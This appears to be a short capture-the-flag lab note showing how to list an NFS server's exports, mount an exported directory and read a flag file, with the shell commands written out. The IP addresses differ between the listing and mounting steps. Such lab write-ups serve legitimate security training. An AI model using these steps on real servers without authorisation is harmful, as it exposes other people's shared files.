# [Miscellaneous Techniques](Miscellaneous%20Techniques.md)
### Review the NFS server's export list and find a directory holding a flag.

```shell
showmount -e 10.129.97.221
```
![](Screenshot%202026-08-10%20at%2012.54.10.png)

Create mount point
```shell
sudo mkdir -p /mnt/nfs
```

Mount to `/var/nfs/general`
```shell
sudo mount -t nfs 10.129.97.234:/var/nfs/general /mnt/nfs
```

Let's check
```shell
ls -la /mnt/nfs
```
![](Screenshot%202026-08-10%20at%2013.14.46.png)

We got the `exports_flag.txt`
```shell
cat /mnt/nfs/exports_flag.txt
```
